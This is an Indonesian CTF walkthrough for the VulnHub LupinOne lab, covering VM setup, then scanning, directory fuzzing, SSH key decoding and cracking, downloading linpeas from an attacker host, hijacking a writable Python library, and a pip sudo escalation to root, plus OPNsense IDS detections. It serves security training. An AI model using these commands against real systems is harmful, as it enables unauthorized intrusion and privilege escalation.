# CTF LUPINONE 
Vulnerable Server: [LupinOne](https://www.vulnhub.com/entry/empire-lupinone,750/)

## Requirement
- [Virtual Box](https://www.virtualbox.org/)
- [Kali linux](https://www.kali.org/get-kali/#kali-virtual-machines)
- [OPNsense](https://opnsense.org/) (optional)
- [LupinOne](https://download.vulnhub.com/empire/01-Empire-Lupin-One.zip)

## Arsitektur Lab

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/arsitektur%20sistem.png)

## Setup Vulnerable Server
- Download file zip di link https://download.vulnhub.com/empire/01-Empire-Lupin-One.zip
- Setelah berhasil didownload, klik kanan file zip tersebut lalu pilih Extract Here

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/setup%201.jpg)

- Setelah proses ekstrak berhasil akan terdapat folder `01 - Empire Lupin One` yang berisi file berikut

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/setup%202.JPG)

- Buka aplikasi Virtual Box lalu klik tombol **New**

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/setup%203.JPG)

- Beri nama `Lupin One` lalu pilih folder tempat penyimpanan virtual machine. Pada field Type pilih **Linux** dan pada field Version pilih **Other Linux (64 bit)**. Jika sudah tekan tombol **Next**

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/setup%204.JPG)

- Selanjutnya buat base memory menjadi 1024 MB dan tekan tombol **Next**

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/setup%205.JPG)

- Selanjutnya pilih opsi **Use an Existing Virtual Hard Disk File** jika hard disk belum ditambahkan anda bisa klik icon folder berikut

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/setup%206.JPG)

- Lalu tekan tombol **Add**

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/setup%207.JPG)

- Arahkan ke lokasi hasil ekstraksi diatas, lalu pilih hard disk virtual dan tekan tombol **Open**

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/setup%208.JPG)

- Setelah hard disk virtual berhasil ditambahkan, selanjutnya tekan tombol **Choose**

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/setup%209.JPG)

- Pastikan hard disk virtual berhasil terpilih seperti berikut, jika sudah tekan tombol **Next**

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/setup%2010.JPG)

- Lalu tekan tombol **Finish** dan machine siap dijalankan

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/setup%2011.JPG)

## Penyelesaian
- Melakukan konfigurasi routing pada Kali Linux
```sh
ip route add 192.168.1.0/24 via 192.168.100.7
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%201.JPG)

- Menemukan IP Address target
```sh
nmap -sn 192.168.1.0/24
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%202.JPG)

- Melakukan Port Scanning pada target 
```sh
nmap -sC -sV 192.168.1.107
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%203.JPG)

- Sekarang kita coba buka halaman web lewat browser dengan URL `http://<IP_server>` 

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%204.JPG)

- Buka file `robots.txt` dengan URL `http://<IP_server>/robots.txt`

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%205.JPG)

- Jika kita buka halaman `/~myfiles` dengan URL `http://<IP_Server>/~myfiles`halaman tersebut tidak berisi apa-apa

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%206.JPG)

- Melakukan web directory brute force dengan tool `ffuf` untuk melihat ada halaman apa saja didalam website target
```sh
ffuf -c -u http://192.168.1.107/~FUZZ -w /usr/share/wordlists/dirb/common.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%207.JPG)

- Dari hasil web directory brute force diatas ditemukan halaman `/~secret/`. Jika kita buka dengan URL `http://<IP_Server>/~secret` isi halaman tersebut adalah sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%208.JPG)

- Dari uraian petunjuk diatas, terdapat halaman tersembunyi yang berisi kunci SSH dan nama usernya adalah `icex64`
- Sekarang kita lakukan web directory brute force dengan tool `ffuf` untuk menemukan halaman tersembunyi yang berisi kunci SSH
```sh
ffuf -c -ic -u http://192.168.1.107/~secret/.FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fc 403 -e .html,.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%209.JPG)

- Dari hasil web directory brute force diatas ditemukan halaman `/~secret/.mysecret.txt`. Jika kita buka dengan URL `http://<IP_Server>/~secret/.mysecret.txt` isi halaman tersebut adalah sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2010.JPG)

- Kunci tersebut sepertinya dalam kondisi terencode. Setelah kita mencoba beberapa algoritma, kunci tersebut berhasil terdecode menggunakan base58
- Buka tool Cyber Chef https://gchq.github.io/CyberChef/ di tab baru

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2011.JPG)

- Ketik `base58` di field Search lalu drag label `From Base58` ke kolom Recipe

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2012.jpg)

- Copy kunci diatas lalu paste di kolom Input

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2013.JPG)

- Buat file dengan nama `ssh_key.rsa` menggunakan editor nano lalu paste hasil decode kunci diatas. Tekan `Ctrl+O` lalu enter untuk menyimpan dan tekan `Ctrl+X` untuk keluar
```sh
nano ssh_key.rsa
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2014.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2015.png)

- Ekstrak hash dari file `ssh_key.rsa` menggunakan tool `ssh2john` dan simpan dengan nama file `hash`
```sh
ssh2john ssh_key.rsa > hash
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2016.JPG)

- Crack hash tersebut menggunakan tool `john the ripper` dan menggunakan wordlist `fasttrack.txt` sesuai petunjuk di halaman web `http://<IP_Server>/~secret`
```sh
john --wordlist=/usr/share/wordlists/fasttrack.txt.txt hash
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2017.JPG)

- Ubah permission file `ssh_key.rsa` menjadi read dan write saja
```sh
chmod 600 ssh_key.rsa
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2018.JPG)

- Sekarang kita sudah memiliki file `ssh_key.rsa` sebagai kunci SSH beserta passphrase dan nama user `icex64` sehingga kita tinggal mengakses SSH server dengan informasi tersebut. Jika anda diminta konfirmasi untuk meneruskan koneksi silahkan ketik `yes` lalu masukkan password diatas
```sh
ssh -i ssh_key.rsa icex64@<IP_Server>
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2019.JPG)

- Kita berhasil menemukan user flag di direktori `/home/icex64`
```sh
cat /home/icex64/user.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2020.JPG)

- Melakukan pengecekan akses `sudo` yang dimiliki user `icex64`
```sh
sudo -l
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2021.JPG)

- Disini user `icex64` bisa menjalankan file `/home/arsene/heist.py`, setelah dibuka program tersebut menggunakan library python `webbrowser`. Namun sayangnya kita tidak dapat menemukan tempat library `webbrowser` disimpan menggunakan perintah `locate`
```sh
cat /home/arsene/heist.py
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2022.JPG)

- Unduh program [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master) untuk menemukan jalur privilage escalation di linux
- Buka terminal baru, ketik perintah `ifconfig` untuk melihat IP Kali Linux dan serving program `linpeas.sh` menggunakan python
```sh
ifconfig
python3 -m http.server 80
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2023.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2024.JPG)

- Unduh program `linpeas.sh`
```sh
cd /tmp
wget <IP_Attacker>/linpeas.sh
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2025.JPG)

- Setelah berhasil terunduh, beri permission execute pada file `linpeas.sh` lalu jalankan file tersebut
```sh
chmod +x linpeas.sh
./linpeas.sh
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2026.JPG)

- Lokasi file `webbrowser.py` ditemukan dan file itu ternyata bisa diakses oleh siapa saja
```sh
ls -la /usr/lib/python3.9/webbrowser.py
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2027.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2028.JPG)

- Edit file `webbrowser.py` menggunakan editor nano
```sh
nano /usr/lib/python3.9/webbrowser.py
```
- Lalu sisipkan kode berikut ini. Tekan `Ctrl+O` lalu enter untuk menyimpan dan tekan `Ctrl+X` untuk keluar
```sh
os.system("/bin/bash")
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2029.JPG)

- Switch ke user `arsene` menggunakan `heist.py`
```sh
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2030.JPG)

- Melakukan pengecekan akses `sudo` yang dimiliki user `arsene`
```sh
sudo -l
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2031.JPG)

- User `arsene` memiliki akses sudo ke user root melalui service `/usr/bin/pip`. Menurut referensi di web https://gtfobins.github.io/gtfobins/pip/ cara melakukan privilage escalation adalah sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2032.JPG)

- Jalankan satu persatu baris perintah diatas untuk mendapatkan akses root
```sh
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2033.JPG)

- Kita berhasil menemukan root flag
```sh
cat /root/root.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/lupinone%2034.JPG)

## Hasil IDS OPNsense
- Deteksi aktivitas penggunaan nmap pada jaringan

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/ids%201.JPG)

- Deteksi aktivitas penggunaan nmap pada server

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/ids%202.JPG)

- Deteksi pengunduhan script linpeas.sh pada server

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/lupinone/assets/ids%203.JPG)

## Peringatan
Semua materi yang disajikan disini hanya digunakan sebagai media pembelajaran. Penulis tidak bertanggung jawab atas penyalahgunaan dari materi tersebut